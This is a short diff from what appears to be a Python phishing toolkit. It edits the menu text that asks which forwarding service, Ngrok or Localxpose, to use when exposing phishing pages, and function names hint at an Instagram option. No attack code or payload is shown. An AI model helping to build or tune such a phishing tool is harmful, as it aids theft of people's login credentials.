@@ -63,8 +63,8 @@ def showSafe():
 def showPhishMen():
     showTitle()
     print("Which forwarding service?")
-    print("[1] Ngrok (allows more connections)")
-    print("[2] Localxpose (allows custom subdomain name)")
+    print("[1] Ngrok (allows more connections and more reliable)")
+    print("[2] Localxpose (allows custom subdomain name but unreliable)")
     print("\n[0] back")
     print("Option: ", end="")
 def showInsta():
